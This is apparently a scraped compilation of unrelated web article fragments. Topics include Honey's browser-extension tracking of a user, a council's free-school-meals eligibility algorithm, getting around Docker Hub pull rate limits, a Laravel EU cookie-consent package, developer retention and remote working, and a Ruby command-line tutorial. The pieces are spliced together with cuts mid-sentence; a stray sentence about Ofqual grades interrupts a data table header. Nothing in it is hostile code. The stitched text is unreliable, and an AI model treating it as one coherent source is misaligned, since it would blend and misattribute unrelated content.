<code>talks/subtitles/20200511-okl-berlin-en.vtt</code>, which he looked at on May 13 at 3:09 PM.</p><p><strong>Honey can infer all this information directly from the data they collected.</strong> And the examples we gave only represent a tiny fraction of the information that Honey has. The 27 lines that the examples are based on, only make up just over 1&nbsp;% of the entries Honey has collected on Benni. We have focussed on non-product related page views. But in addition, Honey also knows every product that Benni looked at while he had installed the extension. Further, they could use the data they have for even more conclusions and profiles. For example, they could infer sleep cycles from the timestamps or build interest profiles based on the sites that were visited.</p><div><summary>Raw data as saved by Honey for the events described above</summary><pre>ts,timestamp,store,extension,product,src,sub_src,user_id,device_id,visitor_id,session_id,platform,version,referrer_url,first_referrer_url,language,campaign,location,os,browser,group,is_logged_in,client_ts

Boris Johnson recently blamed the exam results fiasco on ‘a mutant algorithm’, after the one used by Ofqual downgraded almost 40% of the A-level grades assessed by teachers.

<h2><span>Prepare for the worst</span></h2>
<p><span>We started this project not long after the Cambridge Analytica scandal, which was a vivid reminder of how wrong things can go if safeguards are not properly put in place from the start and we don’t work up the worst case scenarios.&nbsp;</span></p>
<p><span>Throughout the design phase, we asked ourselves: what could go wrong? How might unintended consequences or negative impact occur? How could the work be misused for a different purpose? Regularly asking these questions influenced some of our decisions.</span></p>
<p><span>Being cautious also influenced design choices: firstly, the software doesn’t store any data, it only evaluates the entitlement and wipes the data afterwards. Secondly, it sits on a council’s local machine and doesn’t rely on third party services.</span></p>
<p><b>Practically: look at the issues that have blighted previous data projects to draw insights on what could go wrong with a project. </b><a href="https://www.mountaingoatsoftware.com/blog/use-a-pre-mortem-to-identify-project-risks-before-they-occur"><b>Pre-mortem sessions</b></a><b> allow us to dig deeper into the potential risks.</b></p>
<h2><span>Invite scrutiny.</span></h2>
<p><span>Algorithms used in government services are essentially an application of a law or a regulation. Laws are subject to scrutiny by committees while they’re being prepared. They’re then further scrutinised in parliament when they’re passed, and in court when they’re part of the judicial system.&nbsp;</span></p>
<p><span>Things can get more opaque when it comes to an internal department applying regulations, with risk of misinterpretation or bias creeping in. Citizens and lawyers can only raise concerns in court once the application of a regulation has had a negative impact on a number of people, by which point the damage is done. Like laws, data-led decision making should be open to scrutiny in order to hold the public sector accountable.&nbsp;</span></p>
<p><span>The requirement for transparency must be extended to the data sources which the algorithms use. Issues arise when the public sector uses privately held sources, such as credit ratings, which are difficult for the public and external experts to access.</span></p>
<p><span>Data-rich approaches offer huge potential for councils to work more openly and effectively by opening up their inner workings, thereby strengthening democracy and fairness.&nbsp;</span></p>
<p><b>Practically: when the public sector funds, procures or develops algorithms, it should impose an Open Government Licence and request that the documentation and code are published openly to invite the scrutiny of the public and experts.</b></p>
<h2><span>Choose the right data tools for the challenge.</span></h2>
<p><span>For readers who aren’t already experts in data science (and for those who are experts, please forgive the oversimplification), it’s worth pointing out that not all data analysis is an algorithm. Algorithms are nothing new; the word itself is derived from</span> <i><span>al-Ḵwārizmī</span></i><span>, a name given to the 9th-century Persian mathematician Abū Ja‘far Muhammad ibn Mūsa. The Merriam-Webster definition is: “a step-by-step procedure for solving a problem”, but currently it’s open to a few interpretations.&nbsp;</span></p>
<p><span>In some algorithms, humans define each step that needs to be applied to get to the results. By contrast, in machine learning or artificial intelligence, the algorithm is programmed to ‘learn’ by spotting patterns as it repeats processes over and over. It becomes impossible to pinpoint how a decision was reached.&nbsp;</span></p>
<p><span>The free school meals algorithm doesn’t use machine learning or artificial intelligence. It takes existing, publicly accountable data, and applies transparent rules which can be modified if better data or insights become available, or a legislative change requires it. When the ‘Benefit Identifier’ determines that a child is entitled to free school meals, it specifies under which clause that decision was reached. The algorithm ‘simply’ replicates the decision tree that a staff member would go through to determine entitlement. Similarly, the brief given by North Lanarkshire Council wasn’t to </span><i><span>predict</span></i><span> whether children would be entitled to free school meals, but to look at the facts – the data that the council holds. In that sense, it doesn’t use the latest technology available but, rather, the most appropriate.</span></p>
<p><b>Practically: it’s tempting to jump on the bandwagon of the latest technologies, such as AI or machine learning, but it’s worth considering whether a tried-and-tested approach might deliver equivalent value and present fewer risks. Unless a successful alpha has informed the technology choice, project briefs should be wary of being too prescriptive about the type of technology to be deployed.</b></p>

<p><span>The responsibility of implementing regulations falls on the public sector. Therefore, it must have the leading role in the design and delivery of data-rich approaches in government. Many of the algorithms mentioned in the articles linked above as being particularly biased, ineffective and opaque are developed by the private sector. The organisations own the intellectual property, leaving the public and commissioners in the dark as to how decisions are reached.</span></p>
<p><span>Other issues arise when the development doesn’t follow the governance, such as procurement, and project/risk management among others. The definition of the challenge should lead the technology development, not the other way around. Teams should be given the opportunity to work on data-rich approaches of increasing complexity.</span></p>
<p><span>To develop the free school algorithm, we worked with council teams who were involved in the end-to-end service: from education, catering, legal, IT, children’s services, and revenues and benefits. We worked with them to design the algorithm and to pick it apart for flaws, and they also participated in testing with users. Involving front-line staff in particular was invaluable, as they have an in-depth knowledge of the service, the users and the data.&nbsp;</span></p>
<p><b>Practically: a data-rich service needs to be created as a collaboration with all stakeholders who use and provide the service. The onus is on the business analysts and data scientists to demystify the technical terms to make the process inclusive, and on the public sector to skill up their teams to lead such projects.</b></p>
<h2><span>Build trust.&nbsp;</span></h2>
<p><img src="https://wearesnook.com/wp-content/uploads/2020/10/1_pms3MJrI6GtBroKadh8dCg.jpeg" alt="" width="366" height="244" srcset="https://wearesnook.com/wp-content/uploads/2020/10/1_pms3MJrI6GtBroKadh8dCg.jpeg 1200w, https://wearesnook.com/wp-content/uploads/2020/10/1_pms3MJrI6GtBroKadh8dCg-300x200.jpeg 300w, https://wearesnook.com/wp-content/uploads/2020/10/1_pms3MJrI6GtBroKadh8dCg-768x512.jpeg 768w, https://wearesnook.com/wp-content/uploads/2020/10/1_pms3MJrI6GtBroKadh8dCg-1024x683.jpeg 1024w" sizes="(max-width: 366px) 100vw, 366px"></p><p><span>During research with other local authorities, we heard time and time again from citizens who feel that organisations hold all the power and they have very little say in the decisions that affect them. The recurring issues with algorithms consistently discriminating against the most disadvantaged citizens (and pupils) prove that they are right to be worried.</span></p>
<p><span>Here are a few pointers on ways to build trust:</span></p>
<ul>
<li>Start with the ‘positive’ services.</li>
</ul>
<p><span>The </span><a href="https://www.gov.uk/government/statistics/fraud-and-error-in-the-benefit-system-financial-year-2018-to-2019-estimates#:~:text=This%20report%20provides%20estimates%20of,overpayments%20was%20%C2%A34.1%20billion"><span>£4.1bn</span></a><span> of benefit overpayment due to fraud and error pales in comparison to the £21bn of unclaimed benefits every year in the UK. And yet, a lot of data-rich innovation efforts are targeted at detecting the risk of fraud and removing benefits.&nbsp;</span></p>
<p><span>By tackling the free school meals award, the interaction between the public sector and citizens starts on a more positive note. This is particularly true in Scotland where, once a pupil is awarded free school meals, the entitlement is not reviewed until the next school year, even if the family’s financial situation changes. The algorithm is therefore designed only to check new entitlement, not to withdraw existing benefits, answering one of the concerns highlighted in research, where families live in fear of seeing their benefits taken away.&nbsp;&nbsp;</span></p>
<ul>
<li>Add to the service, but wait until it is proven to work better than the original process before replacing it.</li>
</ul>
<p><span>Families are still able to apply for free school meals as they did before. The Revenues and Benefits service evaluates their application manually based on the evidence provided, and using the same criteria as the algorithm. This is particularly important for the families who are in ‘edge case’ situations, such as living and studying in different council areas, or those with complicated custody arrangements.&nbsp;</span></p>
<ul>
<li>Inform customers and seek their consent.</li>
</ul>
<p><span>The council informs resident families that they have an automated process, and that should they wish to, they can check regularly if they have become entitled to free school meals and/or …</span></p></div></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As someone who is working with Docker Container images, you came across the new Docker Hub pull rate limit or perhaps you are already here because you encountered the error message <code>You have reached your pull rate limit</code> and are now looking for a solution on how to resolve it.</p><div><pre><code data-lang="sh">  
docker pull wordpress:latest  
  
Error response from daemon: pull access denied <span>for</span> wordpress, repository does not exist or may require ‘docker login’:   
denied: You have reached your pull rate limit. You may increase the limit by authenticating and upgrading: https://www.docker.com/increase-rate-limit  
  
</code></pre></div><p>Look no further as we show different ways how to overcome the Docker Hub pull rate limit.</p><h2 id="docker-hub-rate-limit-consequences">Docker Hub Rate Limit Consequences</h2><p>In order to better quantify the unique solutions lets try to understand how the rate limit works.</p><ul><li><p>100 pull requests per 6 hours for anonymous users. Enforced via IP Address.</p></li><li><p>200 pull request per 6 hours for users on free tier</p></li><li><p>No pull request limit for paying customers</p></li></ul><p>At first glance the numbers of 100/200 pulls per 6 hours don’t look too restrictive until you find out how Docker Hub measures the rate limit:</p><ul><li>Docker Hub defines a pull request as a <code>GET</code> request on registry manifest URLs (<code>/v2/*/manifests/*</code>).</li></ul><p>In plain English this means, if you for example execute <code>docker pull alpine:3.12</code> twice, your rate limit deducts by two, even if on the second command execution the image wasn’t transferred. Every <code>docker pull</code> count against your quota.</p><p>Hitting the request limit is a piece of cake if you deploy your application stack to a cluster that’s behind a NAT or if you use <code>Always</code> as you pull policy.</p><p>If you want to dive into details and for example see what your current quota is, the <a href="https://docs.docker.com/docker-hub/download-rate-limit/">Download Rate Limit</a> section in Docker Hub documentation is a good starting point.</p><h2 id="1-subscribe-to-docker-hub">#1 Subscribe to Docker Hub</h2><p>You didn’t come here for this recommendation. Reassess once more that Docker Hub is de facto the go-to place for all the Open-Souce software binaries and is free for public images. The pricing for unlimited private repositories is fair as well!</p><p>If you are an individual, or a small team of 2-10 people who just need a space to store images, then paying $5 to $7/month per user is the simplest solution.</p><h2 id="2-mirror-images-to-your-own-registry">#2 Mirror Images to your Own Registry</h2><p>Mirroring or copying images from Docker Hub to your own registry might seem like an overkill at the first glance, it has two major benefits regarding security and governance. Especially if you are using Container in an enterprise context, it is considered being best practice.</p><ul><li><p>Security</p><ul><li>Vulnerability overview and scan of all images before deployment</li><li>Enable polices to prevent vulnerable container images from deployment</li></ul></li><li><p>Governance</p><ul><li>Having a clear picture over all container images, software versions and licenses.</li><li>Assurance that 3rd party images can’t be modified in retrospect.</li></ul></li></ul><h3 id="methods-of-mirroring-images-from-one-registry-to-another">Methods of Mirroring Images from One Registry to Another</h3><p>Apart from mirroring images with the docker CLI with <code>pull</code> and<code>push</code>, two solutions exist that can help to automate the replication process.</p><ol><li><a href="https://goharbor.io/docs/2.1.0/administration/configuring-replication/create-replication-rules/">Harbor &amp; Container Registry</a> build in image replication functionality with policies and event rules.</li><li><a href="https://github.com/containers/skopeo">Skopeo</a> to synchronize images between different container registries. Can run as part of the continuous integration workflow.</li></ol><h2 id="3-proxy-to-docker-hub">#3 Proxy to Docker Hub</h2><p>The third option is like option #2, and serves as an immediate step to overcome the Docker Hub rate limit, despite the similarity the advantage of this option is that there are no replication rules needed. Yet you get the same benefits of security and governance as with option #2.</p><p>The Proxy Cache is part of the Harbor 2.1 and our Dedicated Container Registry Service. It is easy to set up: When creating a new project select Proxy Cache and select the link to the registry you want to cache.</p><figure><img src="https://container-registry.com/posts/overcome-docker-hub-rate-limit/Harbor-Container-Registry-Create-Proxy-Docker-Hub.png"><figcaption><h4>Creating a Proxy for Docker Hub</h4></figcaption></figure><p>After the Proxy Cache is set up, you can test by pulling an image via the cache by appending your registry name and project, from for example this:<br><code>docker pull postgres:13</code> To <code>docker pull c8n.io/proxy/postgres:13</code></p><figure><img src="https://container-registry.com/posts/overcome-docker-hub-rate-limit/Harbor-Container-Registry-List-All-Proxied-Images.png"><figcaption><h4>List of All Proxied Images</h4></figcaption></figure><h3 id="how-to-make-sure-that-you-only-pull-images-from-your-own-registry">How to Make sure that you only pull images from your own Registry</h3><p>For the policy to work as desired it is necessary to enforce that we fetch images from the private registry and never from Docker Hub. For Kubernetes, two solutions exist to ease the workflow.</p><ul><li><p><a href="https://github.com/IBM/portieris">Portieris</a> is a Kubernetes admission controller to enforce image security policies. You can create image security policies for each Kubernetes Namespace, or at the cluster level, and enforce different rules for different images.</p></li><li><p>Kubernetes <a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/">Dynamic Admission Control</a> allow you to define callbacks and rewrite image specs to point to your internal registry. There is no ready-made solution yet,</p></li></ul><h3 id="working-with-registry-image-secrets">Working with Registry Image Secrets</h3><p>Having unauthenticated access to the container registry is convenient no passwords no users, it just works. The registry credential operator tries to auto inject secrets into the right places.</p><ul><li>The <a href="https://github.com/alexellis/registry-creds">registry-creds operator</a> will propagate a single ImagePullSecret to all Namespaces within your cluster, so we can pull images with authentication.</li></ul></div></div>]]>

A lot of our clients were asking about a popup like this. Unfortunately, the famous <a href="https://github.com/spatie/laravel-cookie-consent">Spatie package</a> we used on most of our Sites is not addressing this. That was the point where we decided to write our own EU Cookie Consent package.&nbsp;</p><p>&nbsp;Our Goals have been to give users the option to opt-in per service and the developers to check if the user gave permission. As a small goodie, we implemented also an easy way to play out the allowed scripts to your page.</p></div><p><strong>Installation:</strong></p><p>You can install the package via composer:</p><pre><code>composer require the42coders/eu-cookie-consent</code></pre><p><strong>Customize the popup:</strong></p><p>Most of the customization can be done through the config file. First, you need to publish it.</p><pre><code>php artisan vendor:publish --provider="the42Coders\eu-cookie-consent\EuCookieConsentServiceProvider" --tag="config" </code></pre><div><p>The config file has a lot of comments to help you get started.&nbsp;</p><p>The core of the popup is defined in the cookies array. Here you can define the categories and inside of the categories the cookies. Categories are meant to organize the cookie permissions to topics. But feel free to just use one if it fits you.<br>Every parameter in the array which is marked with Optional: in the comment above is optional :). Let's assume you want to add a Facebook cookie permission to the popup.</p><p>This is how the cookies part is looking at the moment.</p></div><pre><code>cookies' =&gt; [
    //The key defines the key in the translations and is used to access the Cookie specific information
    'session' =&gt; [
        //Optional: you can set forced to make it impossible for the user to not accept this cookie.
        'forced' =&gt; 'true',
        //Optional: The description defines the key in the translations
        //'description' =&gt; 'key in translation File'
    ],
    'xsrf-token' =&gt; [
        'forced' =&gt; 'true',
    ],
],</code></pre><p>Now we add facebook permission to it.</p><pre><code>cookies' =&gt; [
    //The key defines the key in the translations and is used to access the Cookie specific information
    'session' =&gt; [
        //Optional: you can set forced to make it impossible for the user to not accept this cookie.
        'forced' =&gt; 'true',
        //Optional: The description defines the key in the translations
        //'description' =&gt; 'key in translation File'
    ],
    'xsrf-token' =&gt; [
        'forced' =&gt; 'true',
    ],
    'facebook' =&gt; [],
],</code></pre><p>Since this Package has multi-language support all the texts are set in the language files. To make changes we need to publish them first.</p><pre><code>php artisan vendor:publish --provider="the42Coders\eu-cookie-consent\EuCookieConsentServiceProvider" --tag="lang" </code></pre><p>In the language file, you just need to add a new key and the content.</p><pre><code>'facebook' =&gt; 'We want facebook to know everything about you. Please let us :).',</code></pre><div><p>That's it! You added new cookie permission to the popup. You can also delete the already existing ones if you don't need them.</p></div><p><strong>Use the Popup:</strong></p><p>Now you want to show the popup on your Laravel site. We recommend to integrate it into your base blade file like the app.blade.php.&nbsp;<br>This will render the Popup HTML and that is all you need.</p><pre><code>{!! EuCookieConsent::getPopup() !!}</code></pre><p><strong>Check for Permissions:</strong></p><p>But now you want to integrate the Facebook connection based on the permission of the user. The package gives you two ways to do so.<br><strong>1. Check for permission in your blade file.</strong></p><pre><code>&lt;head&gt;
    @if(EuCookieConsent::canIUse('facebook'))
        &lt;script&gt;
            alert('all the crazy facebook script stuff');
        &lt;/script&gt;
    @endif
&lt;/head&gt;</code></pre><div><p>This will insert the Script tag only if the User agreed to it in the popup.</p><p><strong>2. Mass render them in your blade file.</strong><br>To do this we need to make a small adjustment to the config file.</p></div><pre><code>'facebook' =&gt; [
    'header' =&gt; '&lt;script&gt;alert(\'all the crazy facebook script stuff\');&lt;/script&gt;',
],</code></pre><p>You can define any non taken key here as you will see later. You just need to use the same on all the cookie permissions you want to render at the same place.<br>In your blade File, you can do this.</p><pre><code>&lt;head&gt;
    {!! EuCookieConsent::getHtml('header') !!}
&lt;/head&gt;</code></pre><div><p>This will collect the header tag from all the cookie permissions the user allowed you to use and just output them here. If you want to have one part in the header and one in the footer you can just define both in the config array.</p></div><p><strong>You made it!</strong></p><p>Your page is now cookie GDPR compliant.&nbsp;<br>If you have any ideas for improvements to this package feel free to contact us.</p>

Few things are more disruptive than when someone leaves the team abruptly, without notice. The thing is, that can happen at any time. Not to be morbid, but accidents happen and health problems can hit suddenly. Contingency planning, like disaster recovery planning, is important for every business. But, what do you do when a key knowledge holder quits before you’ve had time to put a contingency plan in place?</p><p>Unfortunately, this is a worst-case scenario and your options are limited. Evaluate which of your other team members is best qualified to and can fill the vacancy. See if they will. It’s best to give them the option and a suitable reward (compensation). Diligent developers will jump at the chance to prove themselves. But some may not be ready for it – so the risk is that pressuring them will lead them to quit, too.</p><p>If there’s no one else on your team who can fill the role, you need to hire a replacement. Bear in mind, this can take a lot of time. It involves <a href="https://perceptionbox.io/business/staffing-agency-vs-direct-hires-the-opportunity-cost-for-startup-founders/https://perceptionbox.io/business/staffing-agency-vs-direct-hires-the-opportunity-cost-for-startup-founders/">a significant opportunity-cost</a>, especially if it’s left to the startup founder to manage the hiring process. The best option for startups is to work with an IT staffing agency and their talented, vetted pools of highly-skilled software developers and veteran IT specialists. <a href="https://perceptionbox.io/business/choosing-an-it-staffing-agency-in-six-easy-steps/" target="_blank" rel="noopener">Choosing an IT staffing agency</a> will require some effort, but will give you a partner to help with all of your staffing needs.</p></div></div><p id="Project"><h2>Project requirements and data recovery</h2></p><div><div><p>Beyond this, keep all of the documentation the former developer produced – especially the software project requirements. Note that it’s frowned upon legally to go through an employee’s email. But, companies retain the right to access employee work emails if there is a valid business reason to do so. Recovering project-related information and instructions, especially from someone who has left the company, certainly qualifies. Also, check with your remaining team members to see if the developer shared any notes or details they think you should be aware of.</p><p>There’s no doubt that losing a key knowledge-holder or mission-essential team member is a disruption. These efforts will get you back and track to the extent possible.</p></div></div><p id="Additional"><h2>Additional efforts for employees giving notice of leaving</h2></p><div><div><p>It’s a professional best practice and customary for employees to provide advance notice that they intend to leave a company. When they do, you’ll be in much better shape. Immediately determine, as above, if there’s someone on your team able and willing to take their place. Your best bet is to use the remaining time or at least two weeks for a complete handover of the project. The outgoing developer needs to provide training, documentation, and help to identify additional resources to assist their replacement.</p><p>A lot of companies leave it at that, but there’s another option. See if the outgoing developer would be willing to serve as a consultant or part-time specialist for your team. Time requirements can be minimal, as little as 1-8 hours a week. If you can work out an agreement, the disruption will be minimal.</p></div></div><p id=""><h2>Critical retention efforts</h2></p><div><p>Ultimately, the best practice is to do what you can to minimize turnover and the impact of turnover. While some companies go all-out with their retention efforts, there are some critical things to focus on.</p></div><p id="Company"><h2>Company vision</h2></p><div><p>Your company vision says a lot about what your team members can look forward to if they stick around. A company without a vision is at best a placeholder in a dedicated developer’s resume. The company vision needs something for people to “buy” into – whether a groundfloor opportunity in The Next Big Thing, being the premiere (insert niche) specialist in a specific region, or being a growth-minded family owned or community-oriented business. No vision for growth implies no promotions and small raises. Everything else about your company must be consistent with your company vision so it needs to be honest and representative of your visible efforts.</p></div><p id="Continued"><h2>Continued education programs</h2></p><div><div><p>New technologies constantly enter the market. It only makes sense for software developers to be constantly engaged in expanding their skill sets. This applies to two directions – the technical skills your company needs more of now and will need tomorrow. LinkedIn <a href="https://learning.linkedin.com/resources/workplace-learning-report-2018" target="_blank" rel="noopener">indicates 94% of employees</a> will remain with a company longer if it provides continued education opportunities.</p><p>This warrants investing in your development team by giving them the incentive and the practical means to continue developing their skills. It’s in the developers best interest to continuously expand their skills. But, it can be tough with a full-time job plus home and family responsibilities.</p><p>However, you do have a few options for setting up a continued education program. Many companies offer tuition assistance for college and online courses. Online options include sites like <a href="https://www.edx.org/" target="_blank" rel="noopener">EdX</a>, <a href="https://join.skillshare.com/" target="_blank" rel="noopener">LinkedIn Skillshare</a>, <a href="https://www.udemy.com/" target="_blank" rel="noopener">Udemy</a>, <a href="https://ocw.mit.edu/index.htm" target="_blank" rel="noopener">MIT OpenCourseWare</a>, and the<a href="https://www.oeconsortium.org/members/" target="_blank" rel="noopener"> Open Education Consortium</a>. Some companies also offer in-house training and mentorship programs. If you are looking to ramp up fast on skills that your team doesn’t already possess, consider outsourcing with a developer to create a training program, train your team, and provide project oversight.</p><p>Two notes apply to continued education programs. First, it’s a good idea to limit participation until after the six-month anniversary of new hires (when turnover is highest). Second, most companies include a clause in their contract obligating beneficiaries of paid courses to a term of employment. If they separate early, you are entitled to be reimbursed for a portion of the costs Some companies offer training, but don’t provide official certification – making it sort of proprietary as other companies may be reluctant to recognize the training per their own requirements.</p></div></div><div><p><img src="https://perceptionbox.io/wp-content/uploads/2020/11/2.jpg" data-src="https://perceptionbox.io/wp-content/uploads/2020/11/2.jpg" alt="image"></p></div><p id="Career"><h2>Career path program</h2></p><div><div><p>It’s almost standard for developers to change jobs about every two years. Doing so typically nets a 10-20% pay raise, a more senior job title, and more challenging projects. By heeding this standard practice, you can structure a career path program around your continued education program to incentivize keeping your top talent around longer. A career path shines a light on available paths forward within a company based on current and projected needs (vision).</p><p>Simple examples:</p><ul><li>Test Technician &gt; Junior Developer &gt; Developer &gt; Senior Developer &gt; Engineer</li><li>Engineer &gt; Engineering Manager or ML/AI Specialist or Data Scientist</li></ul><p>These titles can extend to more specialized positions or into senior and C-level management.</p><p>You have several options with salaries and compensation to help retain team members.</p><ul><li>Salaries based on job title or as negotiated individually.</li><li>Annual or periodic raises based on time with the company.</li><li>Benefits packages – from 401(k) and stock options to club memberships.</li><li>Employee referral incentives – your team members can be your best recruiters.</li></ul><p>Just as some companies offer a sign-up bonus, incorporate a schedule of incremental tenure bonuses. The military does this by offering reenlistment bonuses for those with special skills to commit to another 2-4 years.</p></div></div><p id="Turnover"><h2>Turnover Triggers and Calendar Tracking</h2></p><div><div><p>Managers will find it useful to keep an employee calendar to track vacation time, performance reviews, birthdays, and company anniversary dates. Being aware of and observing these dates helps to develop trust with your team members. Trust plays an important role in retention.</p><p>A second-year company anniversary is a major turnover landmark. Other triggers that may indicate a team member is at risk of leaving include:</p><ul><li>Announcements of layoffs or acquisition by another company saying there’ll be layoffs</li><li>Other friends or coworkers have recently left</li><li>They didn’t get a recent promotion or expected raise</li><li>They just finished a degree or important certification</li><li>Major life events – deaths in the family, recently married or additions to the family</li><li>Sudden and sustained decreases in production and quality of work</li></ul><p>The more team members trust you and feel they can talk openly with you, the more likely they are to tell you about their plans in advance.</p></div></div><p id="Retention "><h2>Retention with In-House, Distributed and Augmented Teams</h2></p><div><div><p>Retention is critical with teams of all types, but it’s most acute when you have in-house teams that must work on-site. Having actual employees is almost always more expensive than outsourcing. The cost and quality of developers carries over when hiring replacements from a local, often limited, talent pool. Having a vision ahead and a clear cut path to advancing skills, job, and compensation will go a long way to keeping and expanding your top talent.</p><p>By outsourcing with an IT staffing agency, you have a partner to manage retention efforts and provide replacements faster drawing from a larger talent pool. Most companies don’t apply their retention programs for outsourced personnel. Staffing services are very much a part of the “on-demand market” where you only pay for what you need.</p><p>But, nearly all staffing services provide an option for you to directly hire developers. It’s a good practice. Amazon, for example, sources almost all of its seasonal new hires through temporary staffing agencies. Those who last the season and performed in the top 10% have historically been offered full-time job opportunities. Leastwise, when you find someone who fits your team well, who is productive, and happy to learn and take on new challenges – they’re worth keeping.</p></div></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>For organisations that use computers to get stuff done, the Internet means you can spread bits of your organisation out geographically and temporally.</p>

<p>Spreading a workforce geographically is usually called remote working or distributed working. That’s when workers aren’t necessarily close to the location of the main office, they live and work elsewhere. There’s also hybrid working, which is when people are expected to come into an office some times but can work from wherever they like the rest of the time.</p>

<p>Spreading a workforce temporally is usually called flexible working or asynchronous working. That’s when workers aren’t always required to be working at the same time as each other. Although more often than not, there’s usually some ‘core hours’ workers have to be present and available.</p>

<p>For various reasons, some groups of people have experimented with the opportunity the Internet has provided. It has allowed them to find new ways of doing things or new ways of living. And, for another variety of reasons, some people haven’t bothered.</p>

<p>Then, in March, that all changed. Anyone who could work online, usually from a computer, was forced to try this stuff out. If their company hadn’t tried out these new ways of working, they became a guinea pig overnight. A <a href="https://www.cliffsnotes.com/literature/f/flowers-for-algernon/character-analysis/algernon">mouse in a maze</a>, without a scientist overseeing the experiment.</p>

<p>That sucks because, as an organisation, you don’t know what works and what doesn’t. Your workers have been forced to try new things and will have reached their own conclusions. Some might like it, others might not be so keen. There will likely be some people for whom the experience has been traumatic, and those people are going to need our help.</p>

<p>So, ignoring whoever’s job it is to do this stuff, I think it’s time for people working on computers to look sideways (metaphorically) and help each other out. If you manage a team or you’re part of a team, it’s time to build your own New Normal.</p>

<p>Here’s some notes I’ve been making on free-range working<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. And you might like to read about <a href="https://gds.blog.gov.uk/2020/10/07/what-happened-when-we-stopped-having-meetings-and-sending-emails/">this experiment we tried with meetings and emails</a>.</p>

<h2 id="notes-on-free-range-working">Notes on free-range working</h2>

<ol>
  <li>
    <p>We’re trying to create more serendipity for innovation, and make collaboration easier when we’re not in the same place. Show &amp; Tells don’t have to be polished. Share progress, ideas and half-finished thoughts; invite people to comment on your work before it’s completed. This helps replicate putting work up on the wall and giving people a chance to comment on things, especially if they’re not on your team.</p>
  </li>
  <li>
    <p>Check in on your colleagues’ home-working setup. Do they have space? Do they have a desk? Is it well-lit and comfortable? People with better working environments have a new kind of privilege, and so we should be equitable in our approach to free-range working.</p>
  </li>
  <li>
    <p>When everyone you work with is on a screen, everyone is more equal – it’s harder for people to dominate the room. Also, we tend to stop talking over each other and let people finish what they were saying. Cultivate that atmosphere, creating the space for diverse or unheard voices to come to the fore.</p>
  </li>
  <li>
    <p>Spontaneous socialising is a joy. Create a tea break channel and head in there when you’re going to make a cup of tea or coffee. Start a voice chat, either using your work laptop or some headphones connected to a phone.</p>
  </li>

November 3, 2020 | https://longliveruby.com/articles/ruby-command-line-application-homebrew | <a href="https://web.archive.org/web/*/https://longliveruby.com/articles/ruby-command-line-application-homebrew">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The goal of this article is to show you how you can create your command line application using the Ruby programming language and make it available via Homebrew, so anyone can install it quickly and use in seconds.</p>
<p>The article consists of two main parts: building the command line application and making it available via Homebrew.</p>

<p>Our goal is to build a <code>get_joke</code> application that will render a random joke about Chuck Norris. The command will also be able to parse the following arguments:</p>
<ul>
<li><code>random</code> - random jokes that should be displayed. By default, one joke is shown, but if you are prepared to read more, you can pass the <code>-r</code> or <code>--random</code> argument with the number of jokes you would like to see</li>
<li><code>first_name</code> - the first name you would like to see instead of Chuck. It should be possible to pass the custom first name with <code>-f</code> or <code>--first-name</code> argument</li>
<li><code>last_name</code> - the last name you would like to see instead of Norris. It should be possible to pass the custom last name with <code>-l</code> or <code>--last-name</code> argument</li>
<li><code>help</code> - the help command that displays the list of available commands along with the short description. The command is rendered when the <code>-h</code> or <code>--help</code> argument is passed. The command should not display the joke when this argument is passed.</li>
</ul>
<p>As the data source, we will use the <a href="http://api.icndb.com/jokes/random"><code>http://api.icndb.com/jokes/random</code></a> endpoint, which provides a nice and simple API for getting jokes about Chuck.</p>
<p>The program will consist of three parts:</p>
<ul>
<li>Options parsing - we have to parse options passed to the <code>get_joke</code> command. We will achieve it with the <code>OptionParser</code> class, which is a part of the Ruby standard library</li>
<li>Request URL creation - depending on the arguments passed, we have to build a URL that we will call to get the joke or jokes</li>
<li>Request response parsing - once we will perform the request, we have to take care of parsing the response and displaying jokes in the console</li>
</ul>
<p>We won't be using any custom Ruby gems, only code available out of the box with the Ruby.</p>
<h3>Creating executable file</h3>
<p>The very first step is to create an executable file. Create the project directory:</p>
<div><pre><code><span>mkdir</span> <span>get_joke</span>
<span>cd</span> <span>get_joke</span><span>/</span>
</code></pre></div>
<p>and our executable file along with the proper permissions:</p>
<div><pre><code><span>touch</span> <span>bin</span><span>/</span><span>get_joke</span>
<span>chmod</span> <span>+</span><span>x</span> <span>bin</span><span>/</span><span>get_joke</span>
</code></pre></div>
<h3>Creating the program</h3>
<p>We have to add the following shebang line to our script:</p>

<p>This line tells the shell what interpreter should be used to process the rest of the file. It's a preferred approach to the hardcoded interpreter's path to Ruby as it's more portable. We can now execute our program, and we shouldn't see any errors or output:</p>

<p><strong>Parsing arguments passed to the command</strong></p>
<p>As I mentioned before, we will use the <code>OptionParser</code> class, a standard Ruby class for parsing command-line arguments. You can check the documentation <a href="https://ruby-doc.org/stdlib-2.7.0/libdoc/optparse/rdoc/OptionParser.html">https://ruby-doc.org/stdlib-2.7.0/libdoc/optparse/rdoc/OptionParser.html</a></p>
<p>Let's add support for the first argument - <code>random</code> :</p>
<div><pre><code><span>#!/usr/bin/env ruby</span>

<span>require</span> <span>'optparse'</span>

<span>options</span> <span>=</span> <span>{}</span>

<span>parser</span> <span>=</span> <span>OptionParser</span><span>.</span><span>new</span> <span>do</span> <span>|</span><span>parser</span><span>|</span>
  <span>parser</span><span>.</span><span>on</span><span>(</span><span>"-r"</span><span>,</span> <span>"--random RANDOM_JOKES_COUNT"</span><span>,</span> <span>"Render n random jokes"</span><span>)</span>
<span>end</span>

<span>parser</span><span>.</span><span>parse!</span><span>(</span><span>into: </span><span>options</span><span>)</span>

<span>puts</span> <span>options</span><span>.</span><span>inspect</span>
</code></pre></div>
<p>As you can see, the <code>on</code> method from <code>OptionParser</code> takes three arguments:</p>
<ul>
<li>shortcut argument name, which is <code>-r</code> in our case</li>
<li>full argument name which is <code>--random</code> in our case</li>
<li>the description for the argument</li>
</ul>
<p>You can now execute the command with <code>-r</code> argument to see how it's parsed:</p>
<div><pre><code><span>.</span><span>/</span><span>bin</span><span>/</span><span>get_joke</span> <span>-</span><span>r</span> <span>4</span>
<span># =&gt; { random: 4 }</span>
</code></pre></div>
<p>We can add <code>--first-name</code> and <code>--last-name</code> arguments the same way:</p>
